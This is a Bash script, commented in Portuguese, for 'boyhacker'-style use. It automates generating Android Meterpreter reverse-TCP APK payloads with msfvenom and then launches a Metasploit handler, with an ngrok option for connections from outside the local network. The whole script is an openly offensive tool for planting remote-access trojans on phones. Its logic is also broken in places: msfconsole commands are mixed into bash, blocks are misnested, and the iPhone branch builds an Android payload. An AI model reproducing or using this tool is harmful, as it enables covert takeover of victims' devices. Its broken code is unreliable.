#!/bin/bash
#historico
# ------------------------------------------------------------------------
# ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD PARA ANDROID AUTOMATIZADO *
#                    CREATE BY :WHOAMI                                   *
#-------------------------------------------------------------------------
# CORES
CYAN="\033[01;36m"
RED="\033[01;31m"
PRETO="\033[30m"
#   CORES
echo "----------------------------------------------"
echo "SEJA BEM VINDO AO GERADOR DE PAYLOAD DE ANDROID*"
echo "-----------------------------------------------*"
echo 
echo -e "${CYAN}**********************"
echo -e "${RED}** [1]- REDE INTERNA **"   "${PRETO} ***ANDROID**  "
echo -e "${RED}** [2]- REDE EXTERNA  **"  "${PRETO} ***ANDROID*** "
echo -e "${RED}** [3]- REDE INTERNA  **"  "${PRETO} ***IPHONE***  " "${CYAN}---em manutencao---"
echo -e "${RED}** [4]- REDE EXTERNA **"   "${PRETO} ***IPHONE***  " "${CYAN}---em manutencao---"
echo -e "${CYAN}**********************"
echo "qual opcao deseja executar ?"
read opcao
#CRINADO PAYLOAD ANDROID EM REDE INTERNA 
''if [ "$opcao" -eq "1"  ]
then
echo "digite seu ip interno (ETH0)"
read interno
echo "digite a porta aberta "
read porta
echo "digite o nome do aplicativo"
read apk
read apk
CLARO="\033[33m"
PRETO="\033[30m" 
echo -e "${CLARO} CRIANDO PAYLOAD...AGUARDE"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno LPORT=$porta R > /root/boyhacker/$apk.apk
echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo -e "${PRETO}**    PAYLOAD CRIADO COM SUCESSO      **"
echo -e "${PRETO}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo "deseja configurar o metasploit? "
echo "[1]SIM"
echo "[2]NAO"
read option
if [ "$option" -eq "1" ]
then
msfdb init
service  postgresql start
msfconsole
use exploit/multi/handler
echo "digite seu ip que foi criado o payload"
read payload
echo "digite a porta que foi criado o payload"
read port
set payload android/meterpreter/reverse_tcp
set LHOST $payload
set LPORT $port
show options
exploit
else
echo "saindo..."
exit
# CRIANDO PAYLOAD EM IPHONE EM REDE INTERNA :
if [ "$opcao" -eq 3 ]
then
msfvenom -p android/meterpreter/reverse_tcp

#CRIA PAYLOAD ANDROID EM REDE EXTERNA
if [ "$opcao" -eq "2" ]; then
echo "digite seu ip externo"
read externo
echo "digite sua porta aberta"
read porta
echo "digite o nome do aplicativo"
read apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$externo LPORT=$porta R > $apk.apk
echo "deseja abrir o metasploit ? "
echo "[1]SIM"
echo "[2]NAO"
read op
if [ "$op" -eq "sim" ]
then
msfdb init
service  postgresql start
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
echo "digite a porta que foi iniciado o NGROK"
echo read porta
LPORT $porta
show options
exploit
else
echo "SAINDO..."
exit
fi
fi
fi
fi
fi


